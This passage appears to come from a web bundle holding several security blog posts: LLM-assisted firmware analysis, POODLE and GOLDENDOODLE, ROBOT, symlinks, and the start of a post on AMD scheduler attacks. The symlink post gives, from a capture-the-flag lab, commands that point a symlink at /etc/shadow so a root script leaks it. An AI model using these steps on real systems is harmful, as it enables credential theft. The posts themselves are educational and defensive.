    In this post, I’m <strong>not</strong> going to pretend that a Large Language Model (LLM) will magically reverse engineer your firmware for you. Instead, I’ll show how you can use an LLM as an <strong>annotator and sidekick</strong> while you do the real work:
  </p>

  <ul>
    <li>Turning messy <strong>strings</strong> into structured hints</li>
    <li>Summarizing <strong>decompiled functions</strong></li>
    <li>Hypothesizing the purpose of weird <strong>config blobs and scripts</strong></li>
    <li>Supporting your <strong>threat modeling</strong> of the device</li>
  </ul>

  <p>All in a way that keeps you in control, and the AI in a supporting role.</p>

  <blockquote>
    <span class="emoji">⚠️</span> Everything here is about <strong>defensive security / research on devices you own or are authorized to test</strong>.
    Don’t use these techniques on systems you’re not allowed to touch.
  </blockquote>

  <hr />

  <h2>1. The Traditional Firmware Exploration Workflow (Very Short Version)</h2>

  <p>A very typical firmware exploration flow looks like this:</p>

  <ol>
    <li>
      <strong>Obtain firmware</strong><br />
      From a vendor update file, web UI, or by dumping flash via JTAG / SPI.
    </li>
    <li>
      <strong>Triage and unpack</strong><br />
      Use tools like <code>binwalk</code>, <code>dd</code>, <code>unsquashfs</code>, or <code>firmware-mod-kit</code> to unpack file systems and images.
    </li>
    <li>
      <strong>Scan for strings and patterns</strong><br />
      Use <code>strings</code>, <code>grep</code>, or custom scripts to find credentials, URLs, debug commands, etc.
    </li>
    <li>
      <strong>Reverse engineer binaries</strong><br />
      Use tools like <strong>Ghidra</strong>, IDA, Radare2, or Binary Ninja to analyze executables and libraries.
    </li>
    <li>
      <strong>Dynamic analysis / rehosting</strong><br />
      Use QEMU or specialized frameworks for firmware rehosting to actually run firmware in a controlled environment and interact with it.
    </li>
  </ol>

  <p>
    Each step is noisy and produces walls of text and code. That’s where an LLM can make things <strong>less painful</strong>.
  </p>

  <hr />

  <h2>2. Where LLMs Actually Help: “Annotator, Not Autopilot”</h2>

  <p>
    Recent work has looked at using LLMs for <strong>binary code understanding</strong>, such as:
  </p>
  <ul>
    <li>Recovering function names</li>
    <li>Summarizing binary code behavior</li>
    <li>Explaining decompiled functions at a higher level</li>
  </ul>

  <p>
    Industry research has also explored LLMs as <strong>reverse engineering sidekicks</strong> that help malware analysts explain decompiled functions, outline control flows, or draft detection logic—without replacing analysts.
  </p>

  <blockquote>
    <strong>You</strong> do the reversing.<br />
    <strong>The LLM</strong> helps label, summarize, cluster, and explain.
  </blockquote>

  <p>
    Think of it as a hyperactive junior sitting next to you, happy to generate function names, markdown notes, and hypotheses while you decide what’s real and what’s hallucination.
  </p>

  <p>Let’s walk through some concrete examples.</p>

  <hr />

  <h2>3. Strings + LLM: Turning Noise Into Hints</h2>

  <p>A classic first step on a firmware image is just:</p>

  <pre><code>strings firmware.bin | less</code></pre>

  <p>
    But this dumps <em>everything</em>: menu texts, error messages, random config keys, leftover debug prints, etc. You can make this a lot more effective with a little Python and an LLM.
  </p>

  <h3>3.1 Step 1 – Extract and filter strings</h3>

  <p>Here’s a small Python script to extract printable strings from a firmware blob:</p>

  <pre><code>import re
from pathlib import Path

def extract_strings(path, min_len=4):
    data = Path(path).read_bytes()
    pattern = rb"[ -~]{%d,}" % min_len  # printable ASCII
    return [s.decode(errors="ignore") for s in re.findall(pattern, data)]

if __name__ == "__main__":
    strings = extract_strings("firmware.bin")

    # Naive filters: paths, URLs, shell-like commands
    interesting = [
        s for s in strings
        if ("/" in s or "http" in s or "ssh" in s or "admin" in s.lower())
    ]

    for s in interesting[:50]:
        print(s)</code></pre>

  <p>
    You now have a list of “interesting” candidate strings: endpoints, file paths, error messages, maybe even hidden menu options.
  </p>

  <h3>3.2 Step 2 – Ask the LLM to annotate</h3>

  <p>
    Take a subset of these strings (don’t paste your entire firmware dump into a cloud LLM—be mindful of confidentiality) and send them to an LLM with a prompt like:
  </p>

  <blockquote>
    You are an embedded security analyst.<br />
    The following strings were extracted from a router firmware image.<br /><br />
    1. <code>/bin/diagnostic_cli</code><br />
    2. <code>/usr/sbin/backup_cfg</code><br />
    3. <code>POST /apply.cgi</code><br />
    4. <code>admin:admin</code><br />
    5. <code>Enable remote management</code><br /><br />
    For each string:<br />
    - Guess what subsystem it might belong to (web UI, update system, debug, etc.).<br />
    - Mark whether it’s <strong>interesting for security review</strong> and why (1–2 sentences).
  </blockquote>

  <p>
    In code (pseudo-style, using a generic <code>llm_chat()</code> helper so you can plug in OpenAI / local LLM / etc.):
  </p>

  <pre><code>def annotate_strings_with_llm(strings_chunk):
    prompt = (
        "You are an embedded firmware security analyst.\\n\\n"
        "You are given a list of strings extracted from firmware.\\n"
        "For each string, produce:\\n"
        "- category: (web_ui | auth | config | debug | logging | update | other)\\n"
        "- interesting: (yes/no)\\n"
        "- reason: one short sentence.\\n\\n"
        "Strings:\\n"
        + "\\n".join(f"- {s}" for s in strings_chunk)
    )
    # Replace this with your LLM client call
    response = llm_chat(prompt)
    return response

if __name__ == "__main__":
    strings = extract_strings("firmware.bin")
    interesting = [...]  # apply your filters
    chunk = interesting[:40]
    print(annotate_strings_with_llm(chunk))</code></pre>

  <p>
    Suddenly, instead of reading 300 anonymous strings, you get a <strong>structured, human-readable checklist</strong>:
  </p>

  <ul>
    <li>Possible backup subsystem</li>
    <li>Potential default creds</li>
    <li>Hidden diagnostic binaries</li>
    <li>Suspicious URLs / endpoints</li>
  </ul>

  <p>
    You still have to verify everything—but now you have a <strong>prioritized map</strong>.
  </p>

  <hr />

  <h2>4. Ghidra + LLM: Explaining Weird Functions</h2>

  <p>
    Once you move into static analysis, tools like <strong>Ghidra</strong> are the workhorse for exploring firmware binaries. You load ELF/ARM/MIPS binaries, let Ghidra analyze them, and then decompile functions into a pseudo-C view.
  </p>

  <p>
    The hard part is not “disassembling”—it’s <strong>understanding</strong> what a function actually does.
  </p>

  <p>
    Research and experiments with LLMs show they can help with tasks like:
  </p>
  <ul>
    <li><strong>Function name recovery</strong></li>
    <li><strong>Code summarization</strong></li>
    <li>Highlighting security-relevant behavior (auth, crypto, file access, network I/O, etc.)</li>
  </ul>

  <p>That’s perfect for our “annotator” idea.</p>

  <h3>4.1 Workflow</h3>

  <ol>
    <li>
      In Ghidra, decompile a function you suspect is security-relevant:
      <ul>
        <li>Maybe it’s referenced from the <code>/login</code> CGI handler</li>
        <li>Or from a firmware update routine</li>
      </ul>
    </li>
    <li>Copy a sanitized snippet of the decompiled C-like code (omit hard-coded secrets / proprietary stuff if using a cloud LLM).</li>
    <li>Ask the LLM something like:</li>
  </ol>

  <blockquote>
    You are assisting with firmware reverse engineering.<br />
    Here is a decompiled function from an embedded Linux binary (MIPS):<br /><br />
    <pre><code>int sub_40123C(char *user, char *pw) {
    FILE *f = fopen("/etc/passwd", "r");
    if (!f) return -1;
    ...
}</code></pre>
    Tasks:<br />
    1. Give this function a descriptive name (C-style).<br />
    2. Summarize what it does in bullets.<br />
    3. Call out any security-relevant behavior (auth checks, file access, cryptography, etc.).
  </blockquote>

  <p>You’ll often get surprisingly good results:</p>

  <ul>
    <li>Suggested names like <code>check_user_credentials</code>, <code>verify_login</code>, etc.</li>
    <li>Bullet summaries that highlight comparisons, suspicious file paths, or insecure checks.</li>
  </ul>

  <p>
    You can even script this: export decompiled functions or their summaries and feed them to an LLM in batches, building a <strong>“map” of the binary</strong> where each function has:
  </p>

  <ul>
    <li>A human-readable name</li>
    <li>A short description</li>
    <li>Tags like <code>auth</code>, <code>crypto</code>, <code>network</code>, <code>update</code></li>
  </ul>

  <p>
    This mirrors workflows used in both academic research and experimental tools that use LLMs as reverse engineering assistants for malware and binaries.
  </p>

  <hr />

  <h2>5. Configs, Scripts, and “Weird Blobs”: Semantic Tagging</h2>

  <p>
    Firmware images are full of non-binary artifacts:
  </p>
  <ul>
    <li>Shell scripts for initialization</li>
    <li>Lua / Python / proprietary scripting languages</li>
    <li>JSON / XML / custom config formats</li>
    <li>Web templates for CGI-based admin interfaces</li>
  </ul>

  <p>Instead of manually reading each file, you can:</p>

  <ol>
    <li><strong>Programmatically find candidates</strong> – files under <code>/etc/</code>, <code>/usr/script/</code>, <code>/www/</code>, etc.</li>
    <li><strong>Summarize them with an LLM</strong> to label purpose and risk.</li>
  </ol>

  <h3>5.1 Example: scanning shell scripts</h3>

  <pre><code>from pathlib import Path

def list_shell_scripts(root):
    root = Path(root)
    return list(root.rglob("*.sh"))

def summarize_script(path):
    content = Path(path).read_text(errors="ignore")[:4000]  # truncate just in case
    prompt = (
        "You are reviewing firmware init scripts.\\n\\n"
        f"File path: {path}\\n"
        "Script:\\n\\n"
        "\`\`\`sh\\n"
        f"{content}\\n"
        "\`\`\`\\n\\n"
        "Tasks:\\n"
        "1. Briefly summarize what this script does.\\n"
        "2. Call out any security-relevant actions "
        "(starting services, changing permissions, touching auth/crypto, enabling remote access).\\n"
        "3. Rate its review priority: high / medium / low.\\n"
    )
    return llm_chat(prompt)

if __name__ == "__main__":
    for p in list_shell_scripts("squashfs-root"):
        print("=== ", p, " ===")
        print(summarize_script(p))
        print()</code></pre>

  <p>This gives you:</p>

  <ul>
    <li>A quick view of <strong>which scripts matter</strong> (e.g., those enabling remote management or manipulating firewall rules).</li>
    <li>A better starting point when you need to dive deeper manually.</li>
  </ul>

  <p>You can do the same for:</p>

  <ul>
    <li>JSON configs: ask which keys look like <strong>feature flags</strong>, <strong>debug options</strong>, or <strong>update URLs</strong>.</li>
    <li>HTTP templates: ask which endpoints perform sensitive operations.</li>
  </ul>

  <hr />

  <h2>6. LLMs + Rehosting: Augmenting Dynamic Analysis</h2>

  <p>
    The more hardcore end of firmware analysis involves <strong>rehosting</strong>: running firmware in an emulated environment to see how it behaves at runtime. Researchers and practitioners use various frameworks to emulate peripheral devices and remove hardware dependencies.
  </p>

  <p>LLMs can help here too—but again, as annotators:</p>

  <ul>
    <li>
      <strong>Log analysis:</strong> feed chunks of runtime logs (HTTP requests, kernel messages, application logs) into the LLM and ask it to:
      <ul>
        <li>Summarize what the system is doing</li>
        <li>Highlight errors, crashes, or suspicious patterns (e.g., repeated failed logins)</li>
      </ul>
    </li>
    <li>
      <strong>Crash triage:</strong> when fuzzers targeting BusyBox or embedded binaries produce crashing inputs and stack traces, LLMs can help cluster and explain crash types.
    </li>
  </ul>

  <h3>6.1 Example prompt for log triage</h3>

  <blockquote>
    You are a firmware analyst. The following log lines come from an emulated router firmware:<br /><br />
    <pre><code>[HTTPD] POST /apply.cgi action=wan_settings
[HTTPD] user=admin from 192.168.0.10
[KERNEL] device eth0 entered promiscuous mode
[APP] enabling remote_management on port 8080
...</code></pre>
    1. Summarize the key events.<br />
    2. Identify any security-relevant changes.<br />
    3. Suggest 2–3 follow-up checks I should perform against this firmware.
  </blockquote>

  <p>
    You get a quick <strong>human-level summary</strong> instead of reading 500 lines manually.
  </p>

  <hr />

  <h2>7. Limitations and Risks: This Is Not Magic (and That’s Good)</h2>

  <p>Before we get too excited, reality check:</p>

  <ol>
    <li>
      <strong>Hallucinations are real</strong><br />
      LLMs can improve naming and summarization, but they still get things wrong and may invent functionality that isn’t present.
      <ul>
        <li>Never treat LLM output as ground truth.</li>
        <li>Use it as a <strong>hint</strong>, then confirm by reading the actual code / disassembly.</li>
      </ul>
    </li>
    <li>
      <strong>Confidentiality and IP</strong><br />
      If you’re analyzing proprietary firmware, uploading large chunks to a cloud LLM may be unacceptable (legally, ethically, or by contract).
      <ul>
        <li>Consider <strong>local open-source models</strong> for sensitive work.</li>
        <li>Use strict data minimization: send only what you must (e.g., one function, one script).</li>
      </ul>
    </li>
    <li>
      <strong>Ethics and legality</strong><br />
      Secure development and IoT guidance emphasize secure design, responsible vulnerability management, and lifecycle support.
      <ul>
        <li>Use these techniques to <strong>improve</strong> security, not undermine it.</li>
        <li>Follow responsible disclosure practices if you discover real issues.</li>
      </ul>
    </li>
    <li>
      <strong>Skill still required</strong><br />
      Experiences from LLM-powered reverse engineering consistently conclude that LLMs <strong>augment experts</strong>; they don’t turn beginners into instant firmware ninjas.
      <ul>
        <li>You still need to know how toolchains, OSes, networking, and cryptography work.</li>
        <li>LLMs amplify good analysts; they don’t replace them.</li>
      </ul>
    </li>
  </ol>

  <hr />

  <h2>8. Practical Tips: Making LLMs a Useful Firmware Sidekick</h2>

  <p>If you want to actually integrate LLMs into your firmware workflow, here are some practical patterns:</p>

  <ol>
    <li>
      <strong>Use strong roles in prompts</strong>
      <ul>
        <li>“You are an embedded firmware security analyst.”</li>
        <li>“You are assisting reverse engineering of a MIPS-based router binary.”</li>
      </ul>
    </li>
    <li>
      <strong>Give context concisely</strong>
      <ul>
        <li>Mention architecture (ARM/MIPS/x86), OS (Linux/RTOS), and approximate purpose (router, camera, PLC).</li>
        <li>This helps the model make better guesses about functions and config files.</li>
      </ul>
    </li>
    <li>
      <strong>Chunk smartly</strong>
      <ul>
        <li>Don’t send entire file systems.</li>
        <li>Work per-function, per-script, or per-log-chunk.</li>
      </ul>
    </li>
    <li>
      <strong>Always ask for structure</strong><br />
      Ask for JSON-like or bullet-pointed output, for example:
      <pre><code>{
  "function_name": "...",
  "high_level_summary": "...",
  "security_relevance": "..."
}</code></pre>
      <p>This makes it easier to feed back into your own tooling.</p>
    </li>
    <li>
      <strong>Build your own “knowledge notebook”</strong>
      <ul>
        <li>Store LLM explanations in markdown or a small database.</li>
        <li>Link them back to offsets / function addresses / file paths so you can quickly revisit them later.</li>
      </ul>
    </li>
    <li>
      <strong>Compare models</strong>
      <ul>
        <li>Some models are better at code; others at natural language.</li>
        <li>Try both cloud and local options, especially if you need privacy.</li>
      </ul>
    </li>
  </ol>

  <hr />
</body>
</html>`,Gg=`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>POODLE and GOLDENDOODLE Attacks</title>

  <!-- Link to the common style.css -->
  <link rel="stylesheet" href="style.css" />
</head>
<body class="dark">

  <!-- NAVBAR -->
  <nav class="navbar">
    <div class="container nav-container">
      <div class="logo">Hem Parekh's Blog</div>
      <ul class="nav-links">
        <li><a href="index.html#home">Home</a></li>
        <li><a href="index.html#about">About</a></li>
        <li><a href="index.html#experience">Experience</a></li>
        <li><a href="index.html#projects">Projects</a></li>
        <li><a href="blogs.html" class="active">Blog</a></li>
      </ul>
      <button class="theme-toggle" id="themeToggle">Light Mode</button>
    </div>
  </nav>

  <!-- BLOG POST HEADER -->
  <header class="blog-post-header">
    <div class="container">
      <h1 class="blog-post-title">POODLE and GOLDENDOODLE Attacks</h1>
      <p class="blog-post-date">Published on: December 24, 2024</p>
    </div>
  </header>

  <!-- BLOG POST CONTENT -->
  <main>
    <section class="blog-post-content">
      <div class="container">
        <p>
          Encryption protocols are the bedrock of secure online communication, ensuring that data transmitted over
          networks remains confidential and protected from unauthorized access. However, like any technology,
          encryption protocols can have vulnerabilities that skilled attackers can exploit. Two such attacks,
          <b>POODLE</b> (Padding Oracle On Downgraded Legacy Encryption) and <b>GOLDENDOODLE</b>, have gained
          attention for exploiting weaknesses in SSL and TLS, respectively. This blog provides an in-depth look at
          these attacks, how they work, and their implications for modern cybersecurity.
        </p>

        <h2>POODLE Attack (Padding Oracle On Downgraded Legacy Encryption)</h2>
        <h3>Introduction</h3>
        <p>
          The POODLE attack, discovered by Google researchers in October 2014, targets the SSL 3.0 (Secure Sockets
          Layer) protocol. Despite SSL 3.0 being considered obsolete and replaced by more secure protocols like TLS
          (Transport Layer Security), many servers and clients still support SSL 3.0 for backward compatibility
          reasons. This presents a security risk as POODLE takes advantage of vulnerabilities in how SSL 3.0
          implements padding for block cipher encryption, enabling attackers to decrypt sensitive information such
          as cookies, passwords, and session tokens.
        </p>

        <h3>How SSL 3.0 Works</h3>
        <p>
          SSL 3.0 uses block ciphers in CBC (Cipher Block Chaining) mode. This mode encrypts data by dividing it
          into fixed-size blocks, typically 64 or 128 bits. When the data is not a multiple of the block size,
          padding is added to fill the last block. This padding is where SSL 3.0’s vulnerability lies.
        </p>
        <p>
          When a message is decrypted, the padding is checked for correctness. However, SSL 3.0 does not explicitly
          verify the padding bytes, allowing attackers to use a padding oracle attack. If an attacker can observe
          how a server responds to different padding values, they can slowly infer the content of the encrypted
          message.
        </p>

        <h3>POODLE Attack Workflow</h3>
        <ol>
          <li>
            <b>Downgrade Attack:</b> Many browsers and servers that support TLS also support SSL 3.0 for backward
            compatibility. An attacker can exploit this by forcing the connection to downgrade from the more secure
            TLS protocol to SSL 3.0. This is done by intercepting and tampering with the initial handshake between
            the client and the server.
          </li>
          <li>
            <b>Padding Oracle Exploitation:</b> Once SSL 3.0 is being used, the attacker can send maliciously
            crafted requests containing intentionally incorrect padding. Based on the server’s response (e.g., an
            error message or no response), the attacker can infer whether the padding was correct. This
            side-channel information can then be used to decrypt the message byte-by-byte.
          </li>
          <li>
            <b>Decrypting Sensitive Data:</b> With enough time and crafted requests, an attacker can decrypt data
            like authentication cookies, which are used to identify the user in a session. This allows the attacker
            to hijack the user’s session and potentially gain unauthorized access to sensitive information.
          </li>
        </ol>

        <h3>Vulnerable Systems</h3>
        <ul>
          <li>Systems that still support SSL 3.0 for backward compatibility.</li>
          <li>Systems that use CBC-mode cipher suites with SSL 3.0.</li>
        </ul>

        <h3>Impact</h3>
        <p>
          The POODLE attack poses a significant risk because it allows attackers to decrypt HTTPS-protected data,
          exposing sensitive user information. Once decrypted, this information can be used to impersonate users,
          steal credentials, and compromise web sessions.
        </p>

        <h3>Mitigation Strategies</h3>
        <ul>
          <li><b>Disable SSL 3.0:</b> Prevent POODLE attacks by disabling SSL 3.0 on both the client and server.</li>
          <li>
            <b>Enforce TLS-Only Communication:</b> Ensure that all clients and servers use TLS 1.2 or higher
            exclusively. By refusing to accept SSL 3.0 connections, you mitigate the possibility of an attacker
            forcing a downgrade.
          </li>
          <li>
            <b>Enable Secure Cipher Suites:</b> Use secure cipher suites that are not vulnerable to padding oracle
            attacks. Configure your web server to prioritize AEAD (Authenticated Encryption with Associated Data)
            cipher suites.
          </li>
        </ul>

        <h2>GOLDENDOODLE Attack</h2>
        <h3>Introduction</h3>
        <p>
          The GOLDENDOODLE attack, discovered in 2019, is an extension of padding oracle attacks. It specifically
          targets TLS 1.0, 1.1, and 1.2 implementations that use CBC-mode encryption. Like POODLE, it exploits
          vulnerabilities in block cipher padding.
        </p>

        <h3>Mitigation Strategies</h3>
        <ul>
          <li><b>Upgrade to TLS 1.3:</b> The most effective mitigation is upgrading to TLS 1.3.</li>
          <li>
            <b>Disable CBC-Mode Cipher Suites:</b> Use secure alternatives like GCM (Galois/Counter Mode), which is
            less prone to padding attacks.
          </li>
          <li>
            <b>Apply Security Patches:</b> Ensure systems are updated with the latest security patches for TLS
            implementations.
          </li>
        </ul>
      </div>
    </section>
  </main>

  <!-- FOOTER -->
  <footer class="footer">
    <div class="container">
      <p>&copy; 2024 Hem Parekh | All rights reserved.</p>
    </div>
  </footer>

  <!-- Link to JS for theme toggle -->
  <script src="script.js"><\/script>
</body>
</html>`,qg=`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>The ROBOT Attack: Return of Bleichenbacher’s Oracle Threat</title>

  <!-- Link to the common style.css -->
  <link rel="stylesheet" href="style.css" />
</head>
<body class="dark">

  <!-- NAVBAR -->
  <nav class="navbar">
    <div class="container nav-container">
      <div class="logo">Hem Parekh's Blog</div>
      <ul class="nav-links">
        <li><a href="index.html#home">Home</a></li>
        <li><a href="index.html#about">About</a></li>
        <li><a href="index.html#experience">Experience</a></li>
        <li><a href="index.html#projects">Projects</a></li>
        <li><a href="blogs.html" class="active">Blog</a></li>
      </ul>
      <button class="theme-toggle" id="themeToggle">Light Mode</button>
    </div>
  </nav>

  <!-- BLOG POST HEADER -->
  <header class="blog-post-header">
    <div class="container">
      <h1 class="blog-post-title">The ROBOT Attack: Return of Bleichenbacher’s Oracle Threat</h1>
      <p class="blog-post-date">Published on: December 24, 2024</p>
    </div>
  </header>

  <!-- BLOG POST CONTENT -->
  <main>
    <section class="blog-post-content">
      <div class="container">
        <p>
          In 2017, security researchers uncovered a vulnerability that re-exposed a nearly two-decade-old attack against RSA encryption in TLS (Transport Layer Security): the <b>ROBOT attack</b> (Return of Bleichenbacher’s Oracle Threat). Originally discovered by Daniel Bleichenbacher in 1998, the Bleichenbacher Oracle Attack allowed attackers to decrypt sensitive data, such as session keys, by exploiting certain flawed implementations of RSA.
        </p>
        <p>
          Despite advancements in cryptography, misconfigurations in modern RSA implementations have resurfaced this threat, putting specific systems at risk even today. This blog will break down the ROBOT attack, provide examples, and discuss mitigations to protect vulnerable systems.
        </p>

        <h2>How the ROBOT Attack Works</h2>
        <p>
          At the heart of the ROBOT attack is an interaction between a vulnerable server and an attacker where the server unintentionally leaks information about encrypted messages. This process allows attackers to decrypt RSA ciphertexts or perform signing operations with the server’s private key.
        </p>
        <p>
          The attacker sends deliberately malformed RSA ciphertexts to the server, and based on the server’s response (the “oracle”), they can infer details about the decrypted plaintext. By repeating this process enough times, they can eventually decrypt sensitive information.
        </p>

        <h3>Step-by-Step Breakdown of ROBOT:</h3>
        <ol>
          <li><b>Malformed Ciphertexts:</b> The attacker sends specially crafted RSA ciphertexts to the vulnerable server.</li>
          <li><b>Oracle Response:</b> The server attempts to decrypt the ciphertext and responds with information revealing whether the decryption was successful.</li>
          <li><b>Iteration Process:</b> The attacker uses the server’s responses to refine their guesses, repeating this process multiple times.</li>
          <li><b>Decryption of Sensitive Data:</b> After enough iterations, the attacker can decrypt sensitive data such as TLS session keys.</li>
        </ol>

        <h2>Real-World Example of ROBOT</h2>
        <p>
          To better understand how this attack can be used in real-world scenarios, consider a web server that uses RSA encryption to secure TLS connections. If the server’s RSA implementation is vulnerable, an attacker can exploit it to decrypt sensitive information.
        </p>
        <p>
          For example, if a banking website is vulnerable to ROBOT, an attacker could gain access to the TLS session keys, which would allow them to decrypt sensitive information such as login credentials, transaction details, and personal user data. This could lead to serious breaches in confidentiality and data security.
        </p>

        <h2>Affected Systems</h2>
        <p>Various widely-used products have been found vulnerable to ROBOT, including:</p>
        <ul>
          <li>OpenSSL (before version 1.0.2h)</li>
          <li>F5 Networks BIG-IP load balancers</li>
          <li>Cisco devices</li>
          <li>Certain Oracle and Citrix products</li>
        </ul>
        <p>
          Though many systems have since been patched, ROBOT still poses a risk to any system that hasn’t been updated to mitigate this vulnerability.
        </p>

        <h2>Mitigation and Prevention</h2>
        <p>
          Preventing ROBOT attacks requires system administrators and developers to ensure that their RSA implementations are correctly configured. Here are some steps to mitigate the risk of ROBOT:
        </p>
        <ul>
          <li><b>Disable RSA Encryption:</b> The most effective protection is to disable RSA key exchange in favor of Elliptic Curve Diffie-Hellman (ECDHE), which provides forward secrecy and is not vulnerable to ROBOT.</li>
          <li><b>Apply Security Patches:</b> Ensure that you’re using the latest versions of your software libraries and applying all relevant security patches. For instance, upgrading to OpenSSL 1.0.2h or later will mitigate the ROBOT attack.</li>
          <li><b>Implement Stronger Cryptographic Methods:</b> Use stronger encryption protocols such as Elliptic Curve Cryptography (ECC) to secure communications. ECC-based methods, like ECDHE, are considered more secure and resistant to attacks like ROBOT.</li>
          <li><b>Regular Vulnerability Testing:</b> Conduct routine vulnerability assessments and audits to identify and address potential misconfigurations or weaknesses in cryptographic implementations.</li>
        </ul>

        <h3>Example of Mitigation in OpenSSL:</h3>
<div class="code-block">
  <code>
    ssl_protocols TLSv1.2 TLSv1.3;
    ssl_prefer_server_ciphers on;
    ssl_ciphers 'ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384';
  </code>
</div>
<p>
  This configuration forces the server to use Elliptic Curve Diffie-Hellman key exchange methods, providing forward secrecy and reducing the risk of a ROBOT attack.
</p>

        <h2>Conclusion</h2>
        <p>
          The ROBOT attack underscores how vulnerabilities from decades ago can resurface in modern systems due to misconfigurations or unpatched software. Although the original Bleichenbacher attack was discovered in 1998, its return in 2017 highlights the importance of staying vigilant in cryptographic practices and regularly updating systems.
        </p>
        <p>
          By disabling RSA key exchanges, patching vulnerable systems, and implementing stronger encryption protocols, administrators can effectively mitigate the risk of ROBOT attacks and protect sensitive data.
        </p>
      </div>
    </section>
  </main>

  <!-- FOOTER -->
  <footer class="footer">
    <div class="container">
      <p>&copy; 2024 Hem Parekh | All rights reserved.</p>
    </div>
  </footer>

  <!-- Link to JS for theme toggle -->
  <script src="script.js"><\/script>
</body>
</html>`,Yg=`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Exploring Symlinks: Practical Usage and Security Implications</title>

  <!-- Link to the common style for light/dark mode -->
  <link rel="stylesheet" href="style.css" />
</head>
<body class="dark">

  <!-- NAVBAR -->
  <nav class="navbar">
    <div class="container nav-container">
      <div class="logo">Hem Parekh's Blog</div>
      <ul class="nav-links">
        <li><a href="index.html#home">Home</a></li>
        <li><a href="index.html#about">About</a></li>
        <li><a href="index.html#experience">Experience</a></li>
        <li><a href="index.html#projects">Projects</a></li>
        <li><a href="blogs.html" class="active">Blog</a></li>
      </ul>
      <!-- Theme Toggle Button -->
      <button class="theme-toggle" id="themeToggle">Light Mode</button>
    </div>
  </nav>

  <!-- BLOG POST HEADER -->
  <header class="blog-post-header">
    <div class="container">
      <h1 class="blog-post-title">Exploring Symlinks: Practical Usage and Security Implications</h1>
      <p class="blog-post-date">Published on: December 24, 2024</p>
    </div>
  </header>

  <!-- BLOG POST CONTENT -->
  <section class="blog-post-content">
    <div class="container">
      <div class="blog-text">
        <h2>What Are Symlinks?</h2>
        <p>
          In Linux, symbolic links are essentially shortcuts that point to other files or directories. They allow you to reference a file or directory without duplicating its contents. Symlinks are incredibly useful when you need to access or organize files in multiple locations. However, if used carelessly, they can create security vulnerabilities, particularly when root-owned processes interact with user-created symlinks.
        </p>

        <h3>Hard Links vs. Symbolic Links</h3>
        <ul>
          <li><strong>Hard Links:</strong> Direct references to data on disk. Hard links share the same inode with the original file, meaning they’re identical and can’t link to directories.</li>
          <li><strong>Symbolic Links (Symlinks):</strong> References that point to the path of a target file or directory. Symlinks are separate from the original file’s data, so deleting the target will break the link.</li>
        </ul>

        <h2>Creating and Using Symlinks</h2>
        <p>The basic syntax for creating a symlink is:</p>
        <div class="code-block">
          <code>ln -s [target] [symlink_name]</code>
        </div>
        <p>
          • <strong>[target]:</strong> The file or directory you want to link to.<br>
          • <strong>[symlink_name]:</strong> The name of your symlink.
        </p>

        <h3>Examples</h3>
        <div class="code-block">
          <code>
# Creating a symlink to a file<br>
ln -s /home/user/documents/file.txt /home/user/desktop/file_link.txt
          </code>
        </div>
        <p>This creates <code>file_link.txt</code> on your desktop, which behaves like a shortcut to <code>file.txt</code>.</p>

        <div class="code-block">
          <code>
# Creating a symlink to a directory<br>
ln -s /home/user/projects /home/user/desktop/projects_link
          </code>
        </div>
        <p>Accessing <code>projects_link</code> will take you directly to <code>/home/user/projects</code>.</p>

        <h3>Overwriting an Existing Symlink</h3>
        <div class="code-block">
          <code>ln -sf /new/target/path /path/to/existing_symlink</code>
        </div>
        <p>The <code>-f</code> option forces the update of the symlink’s target.</p>

        <h2>Privilege Escalation Using Symlinks</h2>
        <p>
          During my Hack The Box challenge, I learned how symlinks can be used to escalate privileges when system configurations are insecure. Here’s how this works:
        </p>

        <h3>Scenario: Exploiting a Root-Owned Script</h3>
        <p>
          Imagine a script (<code>backup.sh</code>) owned by root regularly copies files from a directory to a root-owned backup location. If the script is designed to follow any symlinks it encounters, this could give normal users access to root-level files.
        </p>

        <h3>Steps to Exploit</h3>
        <div class="code-block">
          <code>
# Step 1: Remove any existing file at /tmp/important_file<br>
rm -f /tmp/important_file<br><br>
# Step 2: Create a symlink pointing to /etc/shadow<br>
ln -s /etc/shadow /tmp/important_file<br><br>
# Step 3: Wait for the root script to run or run it manually if possible<br>
          </code>
        </div>
        <p>
          If the root script copies <code>/etc/shadow</code> to a location accessible to the user, the user can potentially gain root-level information and escalate privileges.
        </p>

        <h2>Mitigating This Exploit</h2>
        <ul>
          <li><strong>Avoid Following Symlinks in Scripts:</strong> Avoid copying or modifying files without checking for symlinks, especially in root-owned scripts.</li>
          <li><strong>Use the <code>-P</code> Option in <code>cp</code>:</strong> This flag tells <code>cp</code> not to follow symlinks, helping to prevent exploitation.</li>
          <li><strong>Restrict Writable Directories:</strong> Limit permissions on directories where files are written or manipulated by privileged processes.</li>
        </ul>

        <h2>Conclusion</h2>
        <p>
          Symlinks are an incredibly powerful tool for managing files and directories, but they come with inherent risks if not handled carefully. Understanding how symlinks work and the potential security implications is critical for both system administrators and security professionals. Whether you're organizing files or working on penetration testing challenges, symlinks offer both utility and insight into system-level operations.
        </p>
      </div>
    </div>
  </section>

  <!-- FOOTER -->
  <footer class="footer">
    <div class="container">
      <p>&copy; 2024 Hem Parekh | All rights reserved.</p>
    </div>
  </footer>

  <!-- Link to JS for theme toggle -->
  <script src="script.js"><\/script>
</body>
</html>`,Xg=`<div class="markdown-heading"><h1 class="heading-element">Transient Scheduler Attacks on CPUs: Exploiting AMD’s New Microarchitectural Leak</h1><a id="user-content-transient-scheduler-attacks-on-cpus-exploiting-amds-new-microarchitectural-leak" class="anchor" aria-label="Permalink: Transient Scheduler Attacks on CPUs: Exploiting AMD’s New Microarchitectural Leak" href="#transient-scheduler-attacks-on-cpus-exploiting-amds-new-microarchitectural-leak"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>In 2018, <em>Spectre</em> and <em>Meltdown</em> taught everyone that “just running code” on a CPU was enough to leak data you were <em>never</em> supposed to see. We patched, mitigated, and told ourselves the worst was over.</p>
<p>Fast-forward to 2025 and AMD quietly drops a new phrase into the hardware-security lexicon:</p>
<blockquote>
